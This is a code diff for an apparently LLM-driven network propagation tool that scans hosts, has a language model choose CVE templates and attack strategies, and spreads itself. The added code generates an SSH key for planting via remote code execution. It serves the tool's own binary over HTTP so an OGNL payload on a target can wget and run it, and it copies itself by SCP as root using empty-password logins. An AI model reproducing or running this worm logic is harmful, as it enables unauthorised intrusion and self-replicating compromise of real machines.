@@ -13,6 +13,7 @@
 ///   7. On rejection or failure → append to `rejected_strategies`, retry.
 ///   8. Stop at `MAX_ATTEMPTS` or on `PropagationMethod::NoPath`.
 use std::net::{IpAddr, Ipv4Addr, SocketAddr};
+use std::path::{Path, PathBuf};
 
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
@@ -20,12 +21,11 @@ use physarum_llm::{
     ArtifactType, BootstrapAction, DiscoveryQuery, ExecutionResultSummary, LlmAttemptEvidence,
     LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary, PolicyDecision, PolicyGate,
     PolicyRejectionReason, PortScan, PortState, PropagationMethod, PropagationMethodClass,
-    RejectedStrategy, TransportProtocol, MAX_ATTEMPTS,
+    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol, MAX_ATTEMPTS,
 };
 use physarum_scanner::{
-    result_from_open_port, EvidenceSource as ScanEvidenceSource, NextProbeHint,
-    OsHintSource as ScanOsHintSource, PortList, Scanner, SchemeHint, SensingProfile,
-    STIMULUS_PORTS,
+    effective_stimulus_ports, result_from_open_port, EvidenceSource as ScanEvidenceSource,
+    NextProbeHint, OsHintSource as ScanOsHintSource, PortList, Scanner, SchemeHint, SensingProfile,
 };
 use physarum_sporangium::{PatternFinding, PatternRunner, RunPolicy, SeverityHint};
 
@@ -53,6 +53,7 @@ pub async fn run(
     client: &dyn LlmClient,
     gate: &PolicyGate,
     intel: &VulnerabilityIntelService,
+    local_ip: Option<Ipv4Addr>,
 ) -> Result<LlmOutcome> {
     tracing::info!(%target, stimulus, "LLM reasoning loop started");
 
@@ -69,9 +70,39 @@ pub async fn run(
         .collect();
     let os_hint = infer_os_hint_from_results(&sensing_results);
 
+    // ── Turn 1: LLM template selection ───────────────────────────────────────
+    // Build compact template catalog and let the LLM pick which templates to run.
+    // The catalog is capped at MAX_TEMPLATES_FOR_SELECTION to keep the prompt
+    // token-efficient. CVE-specific templates are always included first.
+    let all_templates = physarum_sporangium::all_templates_with_yaml();
+    let template_catalog = build_template_catalog_for_llm(&all_templates, &port_scans);
+    let selection_query = TemplateSelectionQuery {
+        target: IpAddr::V4(target),
+        ports: port_scans.clone(),
+        available_templates: template_catalog,
+        lineage_summary: build_lineage_summary(lineage),
+    };
+
+    let selected_ids = match client.select_templates(&selection_query).await {
+        Ok(resp) => {
+            tracing::info!(
+                %target,
+                count = resp.selected_ids.len(),
+                reasoning = %resp.reasoning,
+                "LLM Turn 1: template selection complete"
+            );
+            resp.selected_ids
+        }
+        Err(e) => {
+            tracing::warn!(%target, err = %e, "LLM Turn 1 (template selection) failed — running all templates");
+            vec![] // empty = no filter (run all)
+        }
+    };
+
+    // ── Enrich with selected templates ───────────────────────────────────────
     // Enrich with physarum-sporangium pattern evidence on web-like services.
     // Runs once before the attempt loop — findings are stable across retries.
-    let raw_findings = enrich_with_patterns(target, &sensing_results).await;
+    let raw_findings = enrich_with_patterns(target, &sensing_results, &selected_ids).await;
 
     // Dynamic vulnerability intelligence: offline advisory cache first,
     // online OSV query on miss. One call per finding, bounded concurrency.
@@ -97,6 +128,25 @@ pub async fn run(
         tracing::info!(%target, ?cve_ids, "CVE candidates in DiscoveryQuery");
     }
 
+    // ── Ephemeral SSH keypair (Exploit class only) ────────────────────────────
+    // Generated once per target visit — the same pubkey is embedded in every
+    // DiscoveryQuery so the LLM can plant it via RCE in any attempt.
+    // The private key never leaves this process; it is cleaned up after the loop.
+    let ephemeral_key = if gate.exploit_enabled {
+        match generate_ephemeral_keypair().await {
+            Ok(k) => {
+                tracing::info!(%target, pubkey = %k.pubkey, "ephemeral SSH keypair generated");
+                Some(k)
+            }
+            Err(e) => {
+                tracing::warn!(%target, err = %e, "ephemeral keypair generation failed — exploit SSH path unavailable");
+                None
+            }
+        }
+    } else {
+        None
+    };
+
     let mut rejected: Vec<RejectedStrategy> = Vec::new();
 
     for attempt_number in 1..=MAX_ATTEMPTS {
@@ -113,6 +163,8 @@ pub async fn run(
             rejected_strategies: rejected.clone(),
             attempt_number,
             pattern_findings: pattern_summaries.clone(),
+            source_ip: local_ip.map(IpAddr::V4),
+            ephemeral_pubkey: ephemeral_key.as_ref().map(|k| k.pubkey.clone()),
         };
 
         // ── Query LLM ────────────────────────────────────────────────────────
@@ -212,8 +264,28 @@ pub async fn run(
             "policy accepted — executing bootstrap"
         );
 
+        // ── Binary server (Exploit class only) ───────────────────────────────
+        // Start ephemeral HTTP server so the OGNL payload can wget the binary.
+        // Aborted after the bootstrap attempt regardless of outcome.
+        let binary_server = if method_class == PropagationMethodClass::Exploit {
+            if let Some(ip) = local_ip {
+                start_binary_server(ip).await
+            } else {
+                tracing::warn!(%target, "Exploit method selected but local_ip is unknown — binary server skipped");
+                None
+            }
+        } else {
+            None
+        };
+
         // ── Execute bootstrap ─────────────────────────────────────────────────
-        let exec_result = execute_bootstrap(&strategy, target).await;
+        let key_path = ephemeral_key.as_ref().map(|k| k.privkey_path.as_path());
+        let exec_result = execute_bootstrap(&strategy, target, key_path).await;
+
+        // Shut down binary server after bootstrap attempt.
+        if let Some(h) = binary_server {
+            h.abort();
+        }
         let succeeded = matches!(exec_result, ExecutionResultSummary::Success);
 
         let next_action = if succeeded {
@@ -240,9 +312,14 @@ pub async fn run(
 
         if succeeded {
             tracing::info!(%target, attempt = attempt_number, "LLM bootstrap succeeded");
+            // Clean up ephemeral key on success — no longer needed after propagation.
+            if let Some(key) = &ephemeral_key {
+                let _ = tokio::fs::remove_file(&key.privkey_path).await;
+                let pub_path = key.privkey_path.with_extension("pub");
+                let _ = tokio::fs::remove_file(&pub_path).await;
+            }
             let extended = lineage.extend(&target.to_string());
             *lineage = extended;
-            // Carry over evidence from failed attempts into the extended lineage
             return Ok(LlmOutcome::Propagated);
         }
 
@@ -250,6 +327,15 @@ pub async fn run(
     }
 
     tracing::warn!(%target, max = MAX_ATTEMPTS, "LLM max attempts exhausted — dead end");
+
+    // Clean up ephemeral key — private key material must not persist after the loop.
+    if let Some(key) = &ephemeral_key {
+        let _ = tokio::fs::remove_file(&key.privkey_path).await;
+        let pub_path = key.privkey_path.with_extension("pub");
+        let _ = tokio::fs::remove_file(&pub_path).await;
+        tracing::debug!(%target, "ephemeral SSH keypair removed");
+    }
+
     Ok(LlmOutcome::DeadEnd)
 }
 
@@ -293,7 +379,12 @@ async fn fingerprint(
     profile: SensingProfile,
 ) -> Vec<physarum_scanner::SensingResult> {
     let params = profile.params();
-    let port_list = PortList::explicit(params.port_subset.unwrap_or(STIMULUS_PORTS).to_vec());
+    let port_list = PortList::explicit(
+        params
+            .port_subset
+            .map(|s| s.to_vec())
+            .unwrap_or_else(effective_stimulus_ports),
+    );
     match Scanner::new(vec![IpAddr::V4(target)], port_list)
         .batch_size(params.batch_size)
         .timeout_ms(params.timeout_ms)
@@ -763,8 +854,11 @@ fn classify_web_candidate(r: &physarum_scanner::SensingResult) -> ServiceClassif
     ServiceClassification::UnknownNeedsMoreSensing
 }
 
-/// Run all built-in physarum-sporangium templates against every web-like service
-/// on `target`, returning the findings with bounded concurrency.
+/// Run physarum-sporangium templates against every web-like service on `target`.
+///
+/// `selected_ids`: LLM Turn 1 template selection result. When non-empty, only
+/// templates whose id appears in `selected_ids` are probed. An empty slice means
+/// "no filter" (all templates run) — used when Turn 1 fails or returns nothing.
 ///
 /// Classification now uses [`resolve_classification`] which performs a targeted
 /// HTTP probe for `UnknownNeedsMoreSensing` services when `recommended_next_probe`
@@ -773,8 +867,10 @@ fn classify_web_candidate(r: &physarum_scanner::SensingResult) -> ServiceClassif
 async fn enrich_with_patterns(
     target: Ipv4Addr,
     sensing_results: &[physarum_scanner::SensingResult],
+    selected_ids: &[String],
 ) -> Vec<PatternFinding> {
     let mut web_results: Vec<(u16, Option<String>)> = Vec::new(); // (port, scheme_str)
+    let mut non_web_results: Vec<u16> = Vec::new(); // ConfirmedNonWeb ports (FTP, SMTP, …)
 
     for r in sensing_results {
         match resolve_classification(r, target).await {
@@ -805,17 +901,34 @@ async fn enrich_with_patterns(
             ServiceClassification::ConfirmedNonWeb => {
                 tracing::debug!(
                     %target, port = r.port, service_guess = ?r.service_guess,
-                    "ConfirmedNonWeb — spore skipped, forwarded to LLM via PortScan"
+                    "ConfirmedNonWeb — queued for TCP template probing"
                 );
+                non_web_results.push(r.port);
             }
         }
     }
 
-    if web_results.is_empty() {
+    if web_results.is_empty() && non_web_results.is_empty() {
         return vec![];
     }
 
-    let templates = physarum_sporangium::all_templates_with_yaml();
+    let all_templates = physarum_sporangium::all_templates_with_yaml();
+
+    // Apply LLM Turn 1 filter: when selected_ids is non-empty, restrict to those IDs.
+    let templates: Vec<_> = if selected_ids.is_empty() {
+        all_templates
+    } else {
+        all_templates
+            .into_iter()
+            .filter(|t| selected_ids.contains(&t.id))
+            .collect()
+    };
+
+    tracing::info!(
+        %target, template_count = templates.len(), filtered = !selected_ids.is_empty(),
+        "sporangium enrichment: templates selected"
+    );
+
     let policy = RunPolicy {
         allowed_check_ids: templates.iter().map(|t| t.id.clone()).collect(),
         max_response_bytes: 32_768,
@@ -834,7 +947,8 @@ async fn enrich_with_patterns(
         }
     };
 
-    let tasks: Vec<_> = web_results
+    // ── HTTP probing for web ports ────────────────────────────────────────────
+    let http_tasks: Vec<_> = web_results
         .iter()
         .flat_map(|(port, scheme)| {
             let port = *port;
@@ -853,7 +967,7 @@ async fn enrich_with_patterns(
                         Err(e) => {
                             tracing::debug!(
                                 %target, port, check_id = %template.id,
-                                err = %e, "sporangium template probe error"
+                                err = %e, "HTTP template probe error"
                             );
                             vec![]
                         }
@@ -863,13 +977,89 @@ async fn enrich_with_patterns(
         })
         .collect();
 
-    stream::iter(tasks)
+    let mut all_findings: Vec<PatternFinding> = stream::iter(http_tasks)
         .buffer_unordered(MAX_ENRICH_CONCURRENCY)
         .collect::<Vec<_>>()
         .await
         .into_iter()
         .flatten()
-        .collect()
+        .collect();
+
+    /*
+     * ─────────────────────────────────────────────────────────────────────────
+     * EXPANSION POINT — Non-web protocol probing (Attack Path expansion gate)
+     *
+     * Each `ConfirmedNonWeb` port (FTP :21, SMTP :25, POP3 :110, IMAP :143, …)
+     * is matched against every selected template that carries a `tcp_request`
+     * section (e.g. CVE-2015-3306, proftpd-server-detect, vsftpd-detect).
+     *
+     * Extending to a new protocol requires only two artefacts — NO code change
+     * here is needed:
+     *   1. A YAML template under templates/nuclei-legacy/network/… with a `tcp:`
+     *      section (parsed into `TcpRequest` by template.rs at load time).
+     *   2. An advisory-cache JSON file mapping the detected service + version to
+     *      a CVE (picked up automatically by `VulnerabilityIntelService`).
+     *
+     * The routing is intentionally protocol-agnostic: templates self-describe
+     * their check type (`http_check` vs `tcp_request`), so adding SMTP, IMAP,
+     * or any other TCP service validator is pure data — no Rust change needed.
+     * ─────────────────────────────────────────────────────────────────────────
+     */
+    if !non_web_results.is_empty() {
+        let tcp_templates: Vec<_> = templates
+            .iter()
+            .filter(|t| t.tcp_request.is_some())
+            .cloned()
+            .collect();
+
+        if !tcp_templates.is_empty() {
+            tracing::info!(
+                %target,
+                tcp_template_count = tcp_templates.len(),
+                non_web_port_count = non_web_results.len(),
+                "sporangium enrichment: TCP template probing for non-web ports"
+            );
+
+            let tcp_tasks: Vec<_> = non_web_results
+                .iter()
+                .flat_map(|port| {
+                    let port = *port;
+                    let runner = runner.clone();
+                    tcp_templates.iter().map(move |t| {
+                        let runner = runner.clone();
+                        let template = t.clone();
+                        async move {
+                            match runner
+                                .run_tcp_template(&template, IpAddr::V4(target), port)
+                                .await
+                            {
+                                Ok(findings) => findings,
+                                Err(e) => {
+                                    tracing::debug!(
+                                        %target, port, check_id = %template.id,
+                                        err = %e, "TCP template probe error"
+                                    );
+                                    vec![]
+                                }
+                            }
+                        }
+                    })
+                })
+                .collect();
+
+            let tcp_findings: Vec<PatternFinding> = stream::iter(tcp_tasks)
+                .buffer_unordered(MAX_ENRICH_CONCURRENCY)
+                .collect::<Vec<_>>()
+                .await
+                .into_iter()
+                .flatten()
+                .collect();
+
+            all_findings.extend(tcp_findings);
+        }
+    }
+
+    all_findings
 }
 
 /// Convert a `PatternFinding` into the condensed `PatternFindingSummary` that
@@ -931,6 +1121,7 @@ fn build_lineage_summary(lineage: &Lineage) -> physarum_llm::LineageSummary {
 async fn execute_bootstrap(
     strategy: &physarum_llm::PropagationStrategy,
     target: Ipv4Addr,
+    key_path: Option<&Path>,
 ) -> ExecutionResultSummary {
     let plan = match &strategy.bootstrap_plan {
         Some(p) => p,
@@ -943,7 +1134,7 @@ async fn execute_bootstrap(
     };
 
     for (i, step) in plan.steps.iter().enumerate() {
-        match execute_step(&step.action, target, step.timeout_ms).await {
+        match execute_step(&step.action, target, step.timeout_ms, key_path).await {
             StepResult::Ok | StepResult::Simulated => {
                 tracing::debug!(%target, step = i, "step ok");
             }
@@ -966,7 +1157,41 @@ enum StepResult {
     Failed(String),
 }
 
-async fn execute_step(action: &BootstrapAction, target: Ipv4Addr, timeout_ms: u64) -> StepResult {
+/// Resolve the actual binary path for `__self__` sentinel in ScpUpload.
+fn resolve_local_path(local_path: &str) -> String {
+    if local_path == "__self__" {
+        std::env::current_exe()
+            .map(|p| p.to_string_lossy().to_string())
+            .unwrap_or_else(|_| "/usr/local/bin/physarum-maze".to_string())
+    } else {
+        local_path.to_string()
+    }
+}
+
+/// Build SSH/SCP arguments for either ephemeral-key or empty-password auth.
+///
+/// With key: `-i <key_path> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
+/// Without key: caller must prefix command with `sshpass -p ""`
+fn ssh_opts(key_path: Option<&Path>) -> Vec<String> {
+    let mut opts = vec![
+        "-o".into(),
+        "StrictHostKeyChecking=no".into(),
+        "-o".into(),
+        "UserKnownHostsFile=/dev/null".into(),
+    ];
+    if let Some(k) = key_path {
+        opts.push("-i".into());
+        opts.push(k.to_string_lossy().to_string());
+    }
+    opts
+}
+
+async fn execute_step(
+    action: &BootstrapAction,
+    target: Ipv4Addr,
+    timeout_ms: u64,
+    key_path: Option<&Path>,
+) -> StepResult {
     use tokio::process::Command;
     use tokio::time::{timeout, Duration};
 
@@ -983,44 +1208,74 @@ async fn execute_step(action: &BootstrapAction, target: Ipv4Addr, timeout_ms: u6
             }
         }
 
-        BootstrapAction::HttpPost { path, body, port } => {
+        BootstrapAction::HttpPost {
+            path,
+            body,
+            port,
+            headers,
+            accept_any_response,
+        } => {
             let p = port.unwrap_or(80);
             let url = format!("http://{}:{}{}", target, p, path);
-            tracing::info!(%url, "HTTP POST");
+            tracing::info!(%url, custom_headers = headers.len(), accept_any = accept_any_response, "HTTP POST");
             let client = reqwest::Client::new();
-            match timeout(
-                Duration::from_millis(timeout_ms),
-                client.post(&url).body(body.clone()).send(),
-            )
-            .await
-            {
-                Ok(Ok(r)) if r.status().is_success() => StepResult::Ok,
-                Ok(Ok(r)) => StepResult::Failed(format!("HTTP {}", r.status())),
+            let mut req = client.post(&url).body(body.clone());
+            for (k, v) in headers {
+                req = req.header(k.as_str(), v.as_str());
+            }
+            match timeout(Duration::from_millis(timeout_ms), req.send()).await {
+                Ok(Ok(r)) => {
+                    if r.status().is_success() || *accept_any_response {
+                        tracing::info!(
+                            status = r.status().as_u16(),
+                            accept_any = accept_any_response,
+                            "HTTP POST completed"
+                        );
+                        StepResult::Ok
+                    } else {
+                        StepResult::Failed(format!("HTTP {}", r.status()))
+                    }
+                }
                 Ok(Err(e)) => StepResult::Failed(e.to_string()),
                 Err(_) => StepResult::Failed("timeout".into()),
             }
         }
 
-        BootstrapAction::SshCommand { command } => {
-            tracing::info!(%target, %command, "SSH command");
-            let ok = Command::new("sshpass")
-                .args([
-                    "-p",
-                    "",
-                    "ssh",
-                    "-o",
-                    "StrictHostKeyChecking=no",
-                    "-o",
-                    "UserKnownHostsFile=/dev/null",
-                    "-o",
-                    &format!("ConnectTimeout={}", timeout_ms / 1000 + 1),
-                    &format!("ec2-user@{target}"),
-                    command,
-                ])
-                .status()
-                .await
-                .map(|s| s.success())
-                .unwrap_or(false);
+        BootstrapAction::SshCommand { command, user } => {
+            let remote_user = user.as_deref().unwrap_or("root");
+            let connect_timeout = format!("ConnectTimeout={}", timeout_ms / 1000 + 1);
+            tracing::info!(%target, %command, %remote_user, using_key = key_path.is_some(), "SSH command");
+
+            let opts = ssh_opts(key_path);
+            let mut args: Vec<String> = Vec::new();
+            if key_path.is_none() {
+                // Fall back to empty-password auth via sshpass
+            }
+            args.extend(opts);
+            args.push("-o".into());
+            args.push(connect_timeout);
+            args.push(format!("{remote_user}@{target}"));
+            args.push(command.clone());
+
+            let ok = if key_path.is_some() {
+                Command::new("ssh")
+                    .args(&args)
+                    .status()
+                    .await
+                    .map(|s| s.success())
+                    .unwrap_or(false)
+            } else {
+                Command::new("sshpass")
+                    .arg("-p")
+                    .arg("")
+                    .arg("ssh")
+                    .args(&args)
+                    .status()
+                    .await
+                    .map(|s| s.success())
+                    .unwrap_or(false)
+            };
+
             if ok {
                 StepResult::Ok
             } else {
@@ -1031,24 +1286,39 @@ async fn execute_step(action: &BootstrapAction, target: Ipv4Addr, timeout_ms: u6
         BootstrapAction::ScpUpload {
             local_path,
             remote_path,
+            user,
         } => {
-            tracing::info!(%target, %local_path, %remote_path, "SCP upload");
-            let ok = Command::new("sshpass")
-                .args([
-                    "-p",
-                    "",
-                    "scp",
-                    "-o",
-                    "StrictHostKeyChecking=no",
-                    "-o",
-                    "UserKnownHostsFile=/dev/null",
-                    local_path,
-                    &format!("ec2-user@{target}:{remote_path}"),
-                ])
-                .status()
-                .await
-                .map(|s| s.success())
-                .unwrap_or(false);
+            let actual_local = resolve_local_path(local_path);
+            let remote_user = user.as_deref().unwrap_or("root");
+            tracing::info!(
+                %target, local = %actual_local, %remote_path, %remote_user,
+                using_key = key_path.is_some(), "SCP upload"
+            );
+
+            let opts = ssh_opts(key_path);
+            let mut scp_args: Vec<String> = opts;
+            scp_args.push(actual_local);
+            scp_args.push(format!("{remote_user}@{target}:{remote_path}"));
+
+            let ok = if key_path.is_some() {
+                Command::new("scp")
+                    .args(&scp_args)
+                    .status()
+                    .await
+                    .map(|s| s.success())
+                    .unwrap_or(false)
+            } else {
+                Command::new("sshpass")
+                    .arg("-p")
+                    .arg("")
+                    .arg("scp")
+                    .args(&scp_args)
+                    .status()
+                    .await
+                    .map(|s| s.success())
+                    .unwrap_or(false)
+            };
+
             if ok {
                 StepResult::Ok
             } else {
@@ -1115,6 +1385,162 @@ fn method_port(method: &PropagationMethod) -> Option<u16> {
         PropagationMethod::Http { port, .. } => *port,
         _ => None,
     }
+}
+
+// ── Ephemeral SSH keypair ─────────────────────────────────────────────────────
+
+struct EphemeralKey {
+    privkey_path: PathBuf,
+    /// OpenSSH public key string (e.g. "ssh-ed25519 AAAA... physarum-ephemeral").
+    pubkey: String,
+}
+
+/// Generate an ephemeral ed25519 SSH keypair via `ssh-keygen`.
+///
+/// Private key is written to `/tmp/physarum/ephemeral_key` (mode 600).
+/// Public key is returned as an OpenSSH one-liner for embedding in DiscoveryQuery.
+/// Both files are cleaned up by the caller after the exploit loop exits.
+async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey> {
+    use tokio::process::Command;
+
+    let key_dir = PathBuf::from("/tmp/physarum");
+    tokio::fs::create_dir_all(&key_dir).await?;
+
+    let privkey_path = key_dir.join("ephemeral_key");
+    // Remove stale key if present — ssh-keygen refuses to overwrite.
+    let _ = tokio::fs::remove_file(&privkey_path).await;
+    let _ = tokio::fs::remove_file(privkey_path.with_extension("pub")).await;
+
+    let status = Command::new("ssh-keygen")
+        .args([
+            "-t",
+            "ed25519",
+            "-f",
+            privkey_path
+                .to_str()
+                .unwrap_or("/tmp/physarum/ephemeral_key"),
+            "-N",
+            "", // empty passphrase
+            "-C",
+            "physarum-ephemeral", // comment — identifies the key in authorized_keys
+            "-q",                 // quiet
+        ])
+        .status()
+        .await?;
+
+    anyhow::ensure!(status.success(), "ssh-keygen exited with {status}");
+
+    let pubkey_path = privkey_path.with_extension("pub");
+    let pubkey = tokio::fs::read_to_string(&pubkey_path).await?;
+
+    Ok(EphemeralKey {
+        privkey_path,
+        pubkey: pubkey.trim().to_string(),
+    })
+}
+
+// ── Template catalog builder ─────────────────────────────────────────────────
+
+/// Maximum number of templates sent to the LLM for Turn 1 selection.
+/// CVE-specific templates are included first; remaining are sorted alphabetically.
+const MAX_TEMPLATES_FOR_SELECTION: usize = 200;
+
+/// Build a compact `TemplateMeta` catalog for LLM Turn 1 selection.
+///
+/// CVE-specific templates (id starts with "CVE-") are always placed first so
+/// the LLM sees the most actionable candidates even when the list is truncated.
+/// The remaining templates are sorted by id for stable ordering.
+fn build_template_catalog_for_llm(
+    templates: &[physarum_sporangium::PatternTemplate],
+    _ports: &[PortScan],
+) -> Vec<TemplateMeta> {
+    let mut cve_first: Vec<&physarum_sporangium::PatternTemplate> = templates
+        .iter()
+        .filter(|t| t.id.starts_with("CVE-"))
+        .collect();
+    let mut rest: Vec<&physarum_sporangium::PatternTemplate> = templates
+        .iter()
+        .filter(|t| !t.id.starts_with("CVE-"))
+        .collect();
+
+    cve_first.sort_by(|a, b| a.id.cmp(&b.id));
+    rest.sort_by(|a, b| a.id.cmp(&b.id));
+    cve_first.extend(rest);
+
+    cve_first
+        .into_iter()
+        .take(MAX_TEMPLATES_FOR_SELECTION)
+        .map(|t| TemplateMeta {
+            id: t.id.clone(),
+            severity: format!("{:?}", t.info.severity).to_ascii_lowercase(),
+            tags: t.info.tags.clone(),
+        })
+        .collect()
+}
+
+// ── Binary HTTP server for exploit bootstrap ─────────────────────────────────
+
+/// Start a lightweight HTTP server on `local_ip:8001` serving the physarum-maze
+/// binary at `/physarum-maze`. Used by Phase 2 exploit bootstrap: the OGNL payload
+/// on the target runs `wget http://<local_ip>:8001/physarum-maze` to fetch and
+/// execute the binary.
+///
+/// Returns the `JoinHandle` so the caller can shut it down after propagation.
+/// The server is already non-blocking: it listens in the background and the
+/// returned handle can be aborted when the exploit step completes.
+async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHandle<()>> {
+    use tokio::net::TcpListener;
+
+    let binary_path = std::env::current_exe().ok()?;
+    if !binary_path.exists() {
+        tracing::warn!(%local_ip, "binary not found at {:?} — exploit HTTP server not started", binary_path);
+        return None;
+    }
+
+    let addr = SocketAddr::new(IpAddr::V4(local_ip), 8001);
+    let listener = match TcpListener::bind(addr).await {
+        Ok(l) => l,
+        Err(e) => {
+            tracing::warn!(%local_ip, err = %e, "could not bind exploit HTTP server on :8001");
+            return None;
+        }
+    };
+
+    tracing::info!(%local_ip, addr = %addr, "exploit HTTP server started — serving physarum-maze binary");
+
+    let handle = tokio::spawn(async move {
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        loop {
+            let (mut socket, peer) = match listener.accept().await {
+                Ok(s) => s,
+                Err(_) => break,
+            };
+            let binary_path = binary_path.clone();
+            tokio::spawn(async move {
+                let mut buf = [0u8; 512];
+                let _ = socket.read(&mut buf).await;
+                match tokio::fs::read(&binary_path).await {
+                    Ok(data) => {
+                        let header = format!(
+                            "HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
+                            data.len()
+                        );
+                        let _ = socket.write_all(header.as_bytes()).await;
+                        let _ = socket.write_all(&data).await;
+                        tracing::debug!(%peer, bytes = data.len(), "physarum-maze binary served");
+                    }
+                    Err(e) => {
+                        tracing::warn!(%peer, err = %e, "failed to read binary for exploit server");
+                        let _ = socket
+                            .write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n")
+                            .await;
+                    }
+                }
+            });
+        }
+    });
+
+    Some(handle)
 }
 
 /// Collect deduplicated CVE IDs from all pattern-finding candidates.
